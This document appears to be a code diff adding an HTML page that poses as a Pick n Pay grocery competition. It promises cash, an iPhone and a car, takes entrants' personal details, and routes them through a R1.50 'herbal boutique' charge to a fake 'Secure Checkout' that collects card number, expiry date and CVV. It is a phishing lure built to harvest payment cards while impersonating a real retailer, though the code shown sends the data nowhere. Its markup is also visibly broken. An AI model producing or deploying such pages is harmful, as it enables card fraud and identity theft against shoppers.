@@ -1,0 +1,332 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+    <meta charset="UTF-8">
+    <title>Expansion </title>
+    
+
+  </head>
+    
+  <body>
+  <!DOCTYPE html>
+
+<html lang="en">
+
+<head>
+
+<meta charset="UTF-8" />
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+<title>Pick n Pay Online-Portal</title>
+
+<style>
+
+body{
+
+  margin:0;
+
+  font-family: Arial, Calibri, Calibri;
+
+  background: linear-gradient(135deg,#ffdd90,#ffss90);
+
+  color:#5;
+
+}
+
+.page{
+
+  display:none;
+
+  min-height:100vh;
+
+  padding:40px 20px;
+
+  text-align:center;
+
+}
+
+.active{ display:block; }
+
+h1{ font-size:38px; }
+
+.card{
+
+  background:white;
+
+  max-width:420px;
+
+  margin:30px auto;
+
+  padding:25px;
+
+  border-radius:12px;
+
+  box-shadow:0 10px 25px rgba(0,0,0,0.2);
+
+}
+
+input, select, button{
+
+  width:100%;
+
+  padding:12px;
+
+  margin:8px 0;
+
+  border-radius:6px;
+
+  border:1px solid #ccc;
+
+  font-size:14px;
+
+}
+
+button{
+
+  background:#ff6a00;
+
+  color:white;
+
+  font-weight:bold;
+
+  border:none;
+
+  cursor:pointer;
+
+}
+
+button:hover{ opacity:.9 }
+
+.highlight{
+
+  font-size:20px;
+
+  font-weight:bold;
+
+  margin:20px 0;
+
+}
+
+.prizes{
+
+  font-size:18px;
+
+  line-height:1.6;
+
+}
+
+</style>
+
+</head>
+
+<body>
+
+<!-- INTRO PAGE -->
+
+<div class="page active" id="intro">
+
+  <h1>Win Big Pick n Pay Grocery Competition</h1>
+
+  <p class="highlight">Enter today for a chance to win:</p>
+
+  <div class="prizes"> 
+  
+   R65 000! Cash Prize<br>
+
+    All NEW iPhone 17 pro!<br>
+
+    Suzuki Swift OR Brand New Samsung 594L Fridge<br>
+    
+
+  </div>
+
+  <button onclick="showPage('signup')">Enter Competition Now</button>
+  
+
+  <p    >
+ <h4> <small> <small> <small>
+    upon entry you will receive 50% OFF groceries voucher which will be redeemable at your local Pick n Pay hypermarket. T&Cs apply</p>
+
+</div>
+
+<!-- SIGNUP PAGE -->
+
+<div class="page" id="signup">
+
+  <h2>Submit Entry Form</h2>
+  
+  <div class="card">
+
+    <input id="name" placeholder="Full Name" required>
+
+    <input id="phone" placeholder="Phone Number">
+
+    <input id="email" type="email" placeholder="Email">
+
+    <input id="age" type="number" placeholder="Age">
+
+    <select id="province">
+
+      <option>Province</option>
+
+      <option>Gauteng</option>
+
+      <option>Western Cape</option>
+
+      <option>KwaZulu-Natal</option>
+
+      <option>Eastern Cape</option>
+
+      <option>Limpopo</option>
+
+      <option>Mpumalanga</option>
+
+      <option>Free State</option>
+
+      <option>North West</option>
+
+      <option>Northern Cape</option>
+
+    </select>
+
+    <input id="town" placeholder="Town">
+
+    <button onclick="submitSignup()">Continue</button>
+
+  </div>
+
+</div>
+
+<!-- BOUTIQUE PAGE -->
+
+<div class="page" id="boutique">
+
+  <h1>🌿 Ancient African Wisdom Boutique 🌿</h1>
+
+  <p>
+
+  Discover traditional African botany, sacred herbs, and ancient knowledge 
+
+  used for spiritual healing and wealth creation practices. 
+
+  </p>
+
+  <div class="card">
+
+    <h3>Secure Checkout</h3>
+    <h4>Total: R1.50</h4>
+
+    <input id="bName" placeholder="Name">
+
+    <input id="bSurname" placeholder="Surname">
+
+    <!-- SAFE PAYMENT BUTTON -->
+
+    <button onclick="securePayment()">
+      
+      Pay Securely (Stripe/PayFast)
+    
+    </button>
+
+  </div>
+
+</div>
+   
+   <!-- CARD INFORMATION -->
+   
+<div class="page" id="secure checkout">
+
+  <h1> Secure Checkout</h2>
+<p>
+  
+</p> 
+<div class="card">
+
+  <h2 style="text-align: left;"><small>Card Number</h2>
+<input id="card number"" placeholder="0000 
+
+0000 0000 0000" required>
+
+  <h2 style="text-align: left;"><small>Expiry Date</h2>
+<input id="expiry date" placeholder="MM/YY" required>
+
+    <h2 style="text-align: left;"><small>CVV</h2>
+<input id="cvv" placeholder="E.g 012" required>
+      
+<h2 style="text-align: left;">Full Name  </h2>
+<input id="dName" placeholder="Name & Surname">
+      
+ <button onclick="payNow()"> Pay Now </button>
+                       
+                         
+           
+          
+          
+<!-- THANK YOU PAGE -->
+
+<div class="page" id="thankyou">
+  
+  <h1>✅ Thank You!</h1>
+
+  <p>Your entry and purchase were successful.</p>
+
+  <p>Good luck in the competition! discounts will be  to you shortly</p>
+
+</div>
+
+<script>
+
+let user = {};
+
+function showPage(id){
+
+  document.querySelectorAll(".page").forEach(p=>p.classList.remove("active"));
+
+  document.getElementById(id).classList.add("active");
+
+}
+
+function submitSignup(){
+
+  user.name = document.getElementById("name").value;
+
+  if(!user.name){
+
+    alert("Please enter your name");
+
+    return;
+
+  }
+
+  showPage("boutique");
+
+}
+
+function securePayment(){
+
+  // simulate payment redirect success
+
+  alert("Redirecting to secure payment gateway...");
+
+  showPage("secure checkout");
+
+}
+ 
+  function payNow(){
+ 
+   
+   showPage("thankyou");
+    
+}
+
+</script>
+
+</body>>
+
+</html>
+    
+  </body>
+  
+</html>
